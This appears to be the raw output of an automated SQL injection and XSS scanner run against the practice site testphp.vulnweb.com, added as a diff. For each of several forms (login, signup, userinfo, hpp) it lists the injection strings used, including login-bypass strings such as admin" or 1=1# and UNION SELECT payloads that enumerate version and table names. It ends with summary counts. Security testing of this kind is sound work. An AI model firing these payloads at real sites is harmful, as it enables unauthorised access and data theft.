+ Script used --> %' or 0=0 union select null, version() #
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/login.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/login.php in the following form *****
+
+ Script used --> %' and 1=0 union select null, table_name from information_schema.tables where table_name like 'user%'#
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/login.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/login.php in the following form *****
+
+ Script used --> admin" or 1=1#
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/login.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/login.php in the following form *****
+
+ Script used --> admin" or 1=1/*
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/login.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/login.php in the following form *****
+
+ Script used --> admin") or ("1"="1
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/login.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/login.php in the following form *****
+
+ Script used --> admin") or ("1"="1"--
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/login.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/login.php in the following form *****
+
+ Script used --> admin") or ("1"="1"#
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/login.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/login.php in the following form *****
+
+ Script used --> admin") or ("1"="1"/*
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/login.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/login.php in the following form *****
+
+ Script used --> admin") or "1"="1
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/login.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/login.php in the following form *****
+
+ Script used --> admin") or "1"="1"--
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/login.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/login.php in the following form *****
+
+ Script used --> admin") or "1"="1"#
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/login.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/login.php in the following form *****
+
+ Script used --> admin") or "1"="1"/*
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/signup.php
+--> Testing form in http://testphp.vulnweb.com/signup.php
+--> Testing form in http://testphp.vulnweb.com/signup.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/signup.php in the following form *****
+
+ Script used --> admin" or 1=1#
+<form action="/secured/newuser.php" method="post" name="form1">
+<table border="0" cellpadding="4" cellspacing="1">
+<tr><td valign="top">Username:</td><td><input name="uuname" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">Password:</td><td><input name="upass" style="width:200px" type="password"/></td></tr>
+<tr><td valign="top">Retype password:</td><td><input name="upass2" style="width:200px" type="password"/></td></tr>
+<tr><td valign="top">Name:</td><td><input name="urname" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">Credit card number:</td><td><input name="ucc" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">E-Mail:</td><td><input name="uemail" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">Phone number:</td><td><input name="uphone" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">Address:</td><td><textarea name="uaddress" rows="5" style="width:200px" wrap="soft"></textarea></td></tr>
+<tr><td align="right" colspan="2"><input name="signup" type="submit" value="signup"/></td></tr>
+</table>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/signup.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/signup.php in the following form *****
+
+ Script used --> admin" or 1=1/*
+<form action="/secured/newuser.php" method="post" name="form1">
+<table border="0" cellpadding="4" cellspacing="1">
+<tr><td valign="top">Username:</td><td><input name="uuname" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">Password:</td><td><input name="upass" style="width:200px" type="password"/></td></tr>
+<tr><td valign="top">Retype password:</td><td><input name="upass2" style="width:200px" type="password"/></td></tr>
+<tr><td valign="top">Name:</td><td><input name="urname" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">Credit card number:</td><td><input name="ucc" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">E-Mail:</td><td><input name="uemail" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">Phone number:</td><td><input name="uphone" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">Address:</td><td><textarea name="uaddress" rows="5" style="width:200px" wrap="soft"></textarea></td></tr>
+<tr><td align="right" colspan="2"><input name="signup" type="submit" value="signup"/></td></tr>
+</table>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/signup.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/signup.php in the following form *****
+
+ Script used --> admin") or ("1"="1
+<form action="/secured/newuser.php" method="post" name="form1">
+<table border="0" cellpadding="4" cellspacing="1">
+<tr><td valign="top">Username:</td><td><input name="uuname" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">Password:</td><td><input name="upass" style="width:200px" type="password"/></td></tr>
+<tr><td valign="top">Retype password:</td><td><input name="upass2" style="width:200px" type="password"/></td></tr>
+<tr><td valign="top">Name:</td><td><input name="urname" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">Credit card number:</td><td><input name="ucc" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">E-Mail:</td><td><input name="uemail" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">Phone number:</td><td><input name="uphone" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">Address:</td><td><textarea name="uaddress" rows="5" style="width:200px" wrap="soft"></textarea></td></tr>
+<tr><td align="right" colspan="2"><input name="signup" type="submit" value="signup"/></td></tr>
+</table>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/signup.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/signup.php in the following form *****
+
+ Script used --> admin") or ("1"="1"--
+<form action="/secured/newuser.php" method="post" name="form1">
+<table border="0" cellpadding="4" cellspacing="1">
+<tr><td valign="top">Username:</td><td><input name="uuname" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">Password:</td><td><input name="upass" style="width:200px" type="password"/></td></tr>
+<tr><td valign="top">Retype password:</td><td><input name="upass2" style="width:200px" type="password"/></td></tr>
+<tr><td valign="top">Name:</td><td><input name="urname" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">Credit card number:</td><td><input name="ucc" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">E-Mail:</td><td><input name="uemail" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">Phone number:</td><td><input name="uphone" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">Address:</td><td><textarea name="uaddress" rows="5" style="width:200px" wrap="soft"></textarea></td></tr>
+<tr><td align="right" colspan="2"><input name="signup" type="submit" value="signup"/></td></tr>
+</table>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/signup.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/signup.php in the following form *****
+
+ Script used --> admin") or ("1"="1"#
+<form action="/secured/newuser.php" method="post" name="form1">
+<table border="0" cellpadding="4" cellspacing="1">
+<tr><td valign="top">Username:</td><td><input name="uuname" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">Password:</td><td><input name="upass" style="width:200px" type="password"/></td></tr>
+<tr><td valign="top">Retype password:</td><td><input name="upass2" style="width:200px" type="password"/></td></tr>
+<tr><td valign="top">Name:</td><td><input name="urname" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">Credit card number:</td><td><input name="ucc" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">E-Mail:</td><td><input name="uemail" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">Phone number:</td><td><input name="uphone" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">Address:</td><td><textarea name="uaddress" rows="5" style="width:200px" wrap="soft"></textarea></td></tr>
+<tr><td align="right" colspan="2"><input name="signup" type="submit" value="signup"/></td></tr>
+</table>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/signup.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/signup.php in the following form *****
+
+ Script used --> admin") or ("1"="1"/*
+<form action="/secured/newuser.php" method="post" name="form1">
+<table border="0" cellpadding="4" cellspacing="1">
+<tr><td valign="top">Username:</td><td><input name="uuname" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">Password:</td><td><input name="upass" style="width:200px" type="password"/></td></tr>
+<tr><td valign="top">Retype password:</td><td><input name="upass2" style="width:200px" type="password"/></td></tr>
+<tr><td valign="top">Name:</td><td><input name="urname" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">Credit card number:</td><td><input name="ucc" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">E-Mail:</td><td><input name="uemail" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">Phone number:</td><td><input name="uphone" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">Address:</td><td><textarea name="uaddress" rows="5" style="width:200px" wrap="soft"></textarea></td></tr>
+<tr><td align="right" colspan="2"><input name="signup" type="submit" value="signup"/></td></tr>
+</table>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/signup.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/signup.php in the following form *****
+
+ Script used --> admin") or "1"="1
+<form action="/secured/newuser.php" method="post" name="form1">
+<table border="0" cellpadding="4" cellspacing="1">
+<tr><td valign="top">Username:</td><td><input name="uuname" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">Password:</td><td><input name="upass" style="width:200px" type="password"/></td></tr>
+<tr><td valign="top">Retype password:</td><td><input name="upass2" style="width:200px" type="password"/></td></tr>
+<tr><td valign="top">Name:</td><td><input name="urname" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">Credit card number:</td><td><input name="ucc" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">E-Mail:</td><td><input name="uemail" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">Phone number:</td><td><input name="uphone" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">Address:</td><td><textarea name="uaddress" rows="5" style="width:200px" wrap="soft"></textarea></td></tr>
+<tr><td align="right" colspan="2"><input name="signup" type="submit" value="signup"/></td></tr>
+</table>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/signup.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/signup.php in the following form *****
+
+ Script used --> admin") or "1"="1"--
+<form action="/secured/newuser.php" method="post" name="form1">
+<table border="0" cellpadding="4" cellspacing="1">
+<tr><td valign="top">Username:</td><td><input name="uuname" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">Password:</td><td><input name="upass" style="width:200px" type="password"/></td></tr>
+<tr><td valign="top">Retype password:</td><td><input name="upass2" style="width:200px" type="password"/></td></tr>
+<tr><td valign="top">Name:</td><td><input name="urname" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">Credit card number:</td><td><input name="ucc" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">E-Mail:</td><td><input name="uemail" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">Phone number:</td><td><input name="uphone" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">Address:</td><td><textarea name="uaddress" rows="5" style="width:200px" wrap="soft"></textarea></td></tr>
+<tr><td align="right" colspan="2"><input name="signup" type="submit" value="signup"/></td></tr>
+</table>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/signup.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/signup.php in the following form *****
+
+ Script used --> admin") or "1"="1"#
+<form action="/secured/newuser.php" method="post" name="form1">
+<table border="0" cellpadding="4" cellspacing="1">
+<tr><td valign="top">Username:</td><td><input name="uuname" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">Password:</td><td><input name="upass" style="width:200px" type="password"/></td></tr>
+<tr><td valign="top">Retype password:</td><td><input name="upass2" style="width:200px" type="password"/></td></tr>
+<tr><td valign="top">Name:</td><td><input name="urname" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">Credit card number:</td><td><input name="ucc" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">E-Mail:</td><td><input name="uemail" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">Phone number:</td><td><input name="uphone" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">Address:</td><td><textarea name="uaddress" rows="5" style="width:200px" wrap="soft"></textarea></td></tr>
+<tr><td align="right" colspan="2"><input name="signup" type="submit" value="signup"/></td></tr>
+</table>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/signup.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/signup.php in the following form *****
+
+ Script used --> admin") or "1"="1"/*
+<form action="/secured/newuser.php" method="post" name="form1">
+<table border="0" cellpadding="4" cellspacing="1">
+<tr><td valign="top">Username:</td><td><input name="uuname" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">Password:</td><td><input name="upass" style="width:200px" type="password"/></td></tr>
+<tr><td valign="top">Retype password:</td><td><input name="upass2" style="width:200px" type="password"/></td></tr>
+<tr><td valign="top">Name:</td><td><input name="urname" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">Credit card number:</td><td><input name="ucc" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">E-Mail:</td><td><input name="uemail" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">Phone number:</td><td><input name="uphone" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">Address:</td><td><textarea name="uaddress" rows="5" style="width:200px" wrap="soft"></textarea></td></tr>
+<tr><td align="right" colspan="2"><input name="signup" type="submit" value="signup"/></td></tr>
+</table>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/signup.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/signup.php in the following form *****
+
+ Script used --> %' or 0=0 union select null, version() #
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/signup.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/signup.php in the following form *****
+
+ Script used --> %' and 1=0 union select null, table_name from information_schema.tables where table_name like 'user%'#
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/signup.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/signup.php in the following form *****
+
+ Script used --> admin" or 1=1#
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/signup.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/signup.php in the following form *****
+
+ Script used --> admin" or 1=1/*
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/signup.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/signup.php in the following form *****
+
+ Script used --> admin") or ("1"="1
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/signup.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/signup.php in the following form *****
+
+ Script used --> admin") or ("1"="1"--
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/signup.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/signup.php in the following form *****
+
+ Script used --> admin") or ("1"="1"#
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/signup.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/signup.php in the following form *****
+
+ Script used --> admin") or ("1"="1"/*
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/signup.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/signup.php in the following form *****
+
+ Script used --> admin") or "1"="1
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/signup.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/signup.php in the following form *****
+
+ Script used --> admin") or "1"="1"--
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/signup.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/signup.php in the following form *****
+
+ Script used --> admin") or "1"="1"#
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/signup.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/signup.php in the following form *****
+
+ Script used --> admin") or "1"="1"/*
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/userinfo.php
+--> Testing form in http://testphp.vulnweb.com/userinfo.php
+--> Testing form in http://testphp.vulnweb.com/userinfo.php
+--> Testing form in http://testphp.vulnweb.com/userinfo.php
+--> Testing form in http://testphp.vulnweb.com/userinfo.php
+--> Testing form in http://testphp.vulnweb.com/userinfo.php
+--> Testing form in http://testphp.vulnweb.com/userinfo.php
+--> Testing form in http://testphp.vulnweb.com/userinfo.php
+--> Testing form in http://testphp.vulnweb.com/userinfo.php
+--> Testing form in http://testphp.vulnweb.com/userinfo.php
+--> Testing form in http://testphp.vulnweb.com/userinfo.php
+--> Testing form in http://testphp.vulnweb.com/userinfo.php
+--> Testing form in http://testphp.vulnweb.com/userinfo.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/userinfo.php in the following form *****
+
+ Script used --> %' or 0=0 union select null, version() #
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/userinfo.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/userinfo.php in the following form *****
+
+ Script used --> %' and 1=0 union select null, table_name from information_schema.tables where table_name like 'user%'#
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/userinfo.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/userinfo.php in the following form *****
+
+ Script used --> admin" or 1=1#
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/userinfo.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/userinfo.php in the following form *****
+
+ Script used --> admin" or 1=1/*
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/userinfo.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/userinfo.php in the following form *****
+
+ Script used --> admin") or ("1"="1
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/userinfo.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/userinfo.php in the following form *****
+
+ Script used --> admin") or ("1"="1"--
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/userinfo.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/userinfo.php in the following form *****
+
+ Script used --> admin") or ("1"="1"#
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/userinfo.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/userinfo.php in the following form *****
+
+ Script used --> admin") or ("1"="1"/*
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/userinfo.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/userinfo.php in the following form *****
+
+ Script used --> admin") or "1"="1
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/userinfo.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/userinfo.php in the following form *****
+
+ Script used --> admin") or "1"="1"--
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/userinfo.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/userinfo.php in the following form *****
+
+ Script used --> admin") or "1"="1"#
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/userinfo.php
+
+
+***** SQL Injection vulnerability discovered in http://testphp.vulnweb.com/userinfo.php in the following form *****
+
+ Script used --> admin") or "1"="1"/*
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/hpp/?pp=12
+
+
+--> Testing http://testphp.vulnweb.com/hpp/?pp=12
+--> Testing form in http://testphp.vulnweb.com/hpp/?pp=12
+
+
+--> Testing http://testphp.vulnweb.com/hpp/?pp=12
+--> Testing form in http://testphp.vulnweb.com/hpp/?pp=12
+
+
+--> Testing http://testphp.vulnweb.com/hpp/?pp=12
+--> Testing form in http://testphp.vulnweb.com/hpp/?pp=12
+
+
+--> Testing http://testphp.vulnweb.com/hpp/?pp=12
+***** Discovered SQL Injection in http://testphp.vulnweb.com/hpp/?pp=12 *****
+
+ Script used --> admin" or 1=1/*
+<form action="params.php?p=valid&amp;pp=12"><input name="aaaa/" type="submit"/></form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/hpp/?pp=12
+
+
+--> Testing http://testphp.vulnweb.com/hpp/?pp=12
+***** Discovered SQL Injection in http://testphp.vulnweb.com/hpp/?pp=12 *****
+
+ Script used --> admin") or ("1"="1
+<form action="params.php?p=valid&amp;pp=12"><input name="aaaa/" type="submit"/></form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/hpp/?pp=12
+
+
+--> Testing http://testphp.vulnweb.com/hpp/?pp=12
+***** Discovered SQL Injection in http://testphp.vulnweb.com/hpp/?pp=12 *****
+
+ Script used --> admin") or ("1"="1"--
+<form action="params.php?p=valid&amp;pp=12"><input name="aaaa/" type="submit"/></form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/hpp/?pp=12
+
+
+--> Testing http://testphp.vulnweb.com/hpp/?pp=12
+--> Testing form in http://testphp.vulnweb.com/hpp/?pp=12
+
+
+--> Testing http://testphp.vulnweb.com/hpp/?pp=12
+***** Discovered SQL Injection in http://testphp.vulnweb.com/hpp/?pp=12 *****
+
+ Script used --> admin") or ("1"="1"/*
+<form action="params.php?p=valid&amp;pp=12"><input name="aaaa/" type="submit"/></form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/hpp/?pp=12
+
+
+--> Testing http://testphp.vulnweb.com/hpp/?pp=12
+***** Discovered SQL Injection in http://testphp.vulnweb.com/hpp/?pp=12 *****
+
+ Script used --> admin") or "1"="1
+<form action="params.php?p=valid&amp;pp=12"><input name="aaaa/" type="submit"/></form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/hpp/?pp=12
+
+
+--> Testing http://testphp.vulnweb.com/hpp/?pp=12
+***** Discovered SQL Injection in http://testphp.vulnweb.com/hpp/?pp=12 *****
+
+ Script used --> admin") or "1"="1"--
+<form action="params.php?p=valid&amp;pp=12"><input name="aaaa/" type="submit"/></form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/hpp/?pp=12
+
+
+--> Testing http://testphp.vulnweb.com/hpp/?pp=12
+--> Testing form in http://testphp.vulnweb.com/hpp/?pp=12
+
+
+--> Testing http://testphp.vulnweb.com/hpp/?pp=12
+***** Discovered SQL Injection in http://testphp.vulnweb.com/hpp/?pp=12 *****
+
+ Script used --> admin") or "1"="1"/*
+<form action="params.php?p=valid&amp;pp=12"><input name="aaaa/" type="submit"/></form>
+
+
+
+Total number of URLs scanned for XSS
+count =  10
+XSS Vulnerabilities found in
+count =  9
+Total number of URLs scanned for SQLi
+count =  10
+SQLi Vulnerabilities found in
+count =  9
